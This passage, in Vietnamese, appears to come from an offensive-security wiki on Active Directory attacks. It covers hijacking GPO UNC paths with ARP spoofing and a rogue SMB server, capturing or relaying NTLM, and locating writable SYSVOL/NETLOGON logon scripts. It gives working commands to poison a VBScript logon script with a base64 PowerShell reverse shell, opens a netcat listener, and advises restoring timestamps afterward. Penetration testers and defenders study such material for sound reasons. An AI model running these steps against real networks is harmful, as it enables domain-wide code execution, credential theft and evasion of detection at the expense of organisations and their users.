- Các file quảng bá `.aas` cũ có thể vẫn còn trong `SYSVOL`, vì vậy hãy xác minh rằng bản triển khai vẫn có vẻ đang hoạt động trước khi dựa vào nó.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> Thu thập NTLM / WebDAV relay

GPP drive mappings trong `Drives.xml` khiến người dùng xác thực tới đường dẫn UNC đã cấu hình khi đăng nhập hoặc kết nối lại. Nếu spoof host được tham chiếu, bạn có thể thu thập **NetNTLMv2**. Nếu cố ý làm SMB thất bại, Windows có thể thử lại qua **WebDAV**, gửi **NTLM qua HTTP**; cách này linh hoạt hơn nhiều khi relay tới **LDAP(S)**, **AD CS** hoặc **SMB**.

#### Logon/startup script UNC hijack

Cách thức tương tự áp dụng cho các script được lưu trữ trên UNC và tìm thấy trong `SYSVOL`:

- **Logon scripts** thường chạy trong ngữ cảnh **user**.
- **Startup scripts** thường chạy trong ngữ cảnh **computer / SYSTEM**.

Nếu đường dẫn script trỏ tới một hostname có thể spoof, hãy chuyển hướng host UNC và cung cấp nội dung script thay thế từ vị trí dự kiến.

## SYSVOL/NETLOGON Logon Script Poisoning

Các đường dẫn có quyền ghi trong `\\<dc>\SYSVOL\<domain>\scripts\` hoặc `\\<dc>\NETLOGON\` cho phép sửa đổi logon scripts được thực thi khi người dùng đăng nhập thông qua GPO. Việc này cho phép thực thi mã trong ngữ cảnh bảo mật của những người dùng đăng nhập.

### Tìm logon scripts
- Kiểm tra các thuộc tính của người dùng để tìm logon script đã cấu hình:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Crawl các share trong domain để tìm shortcut hoặc tham chiếu đến script:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Phân tích các file `.lnk` để xác định đích trỏ đến SYSVOL/NETLOGON (mẹo DFIR hữu ích cho attacker không có quyền truy cập GPO trực tiếp):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound hiển thị thuộc tính script logon `scriptPath` của đối tượng người dùng nếu có. Các script logon được cấu hình bằng GPO là một tham chiếu chính sách riêng, vì vậy cũng hãy kiểm tra GPO áp dụng.

### Xác thực quyền ghi (đừng tin danh sách share)
Công cụ tự động có thể hiển thị SYSVOL/NETLOGON là chỉ đọc ngay cả khi ACL NTFS của script cụ thể đó khác. Hãy bắt đầu bằng việc kiểm tra chỉ đọc tệp và thư mục cha của nó; các ACE Allow khớp vẫn là những ứng viên cần xem xét vì quyền truy cập SMB và NTFS hiệu lực, ACE Deny và token hiện tại đều có ảnh hưởng:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Một bài kiểm tra quyền ghi được ủy quyền phải nhắm đúng mục tiêu và có thể hoàn tác, đồng thời cần sao lưu rồi khôi phục script gốc. Đừng ghi đè lên một logon script đang hoạt động chỉ để kiểm tra quyền truy cập; thao tác ghi thành công có thể khiến script chạy khi người dùng tiếp theo đăng nhập.

### Đầu độc VBScript logon script để thực thi mã từ xa (RCE)
Thêm một lệnh để khởi chạy reverse shell PowerShell (tạo trên revshells.com) và giữ nguyên logic ban đầu để tránh làm hỏng chức năng nghiệp vụ:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Lắng nghe trên host của bạn và chờ lần đăng nhập tương tác tiếp theo:

```bash
rlwrap -cAr nc -lnvp 443
```

Ghi chú:
- Việc thực thi diễn ra dưới token của người dùng ghi nhật ký (không phải SYSTEM). Phạm vi là liên kết GPO (OU, site, domain) áp dụng script đó.
- Sau khi sử dụng, hãy khôi phục nội dung/dấu thời gian ban đầu để dọn dẹp.


## References

- [1] [Lạm dụng ACL/ACE của Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Tài khoản có đặc quyền và đặc quyền token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Cập nhật đường tấn công ACL](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Leo thang đặc quyền bằng ACL trong Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Quét đặc quyền và tài khoản có đặc quyền trong Active Directory](https://adsecurity.org/?p=3658)
- [7] [Hàm khởi tạo ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Thao tác thuộc tính AD/UAC từ Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (tư cách thành viên nhóm)](https://www.samba.org/)
- [10] [HTB Puppy: Lạm dụng AD ACL, bẻ khóa KeePassXC Argon2 và giải mã DPAPI để giành quyền quản trị DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - Vòng quanh ARP rồi tìm ra: Chiếm quyền đường dẫn UNC của GPO để thực thi mã và NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: khai thác GPO của Active Directory thông qua NTLM relay và hơn thế nữa](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU đang đùa đấy à? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: khai thác các vector tấn công ACL của Organizational Unit ẩn trong Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Mô phỏng các dịch vụ Active Directory hợp pháp trên mạng: trường hợp khai thác GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [GPOddity của Synacktiv](https://github.com/synacktiv/GPOddity)
- [17] [OUned của Synacktiv](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — Di chuyển giữa các OU và lạm dụng ACL kế thừa](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
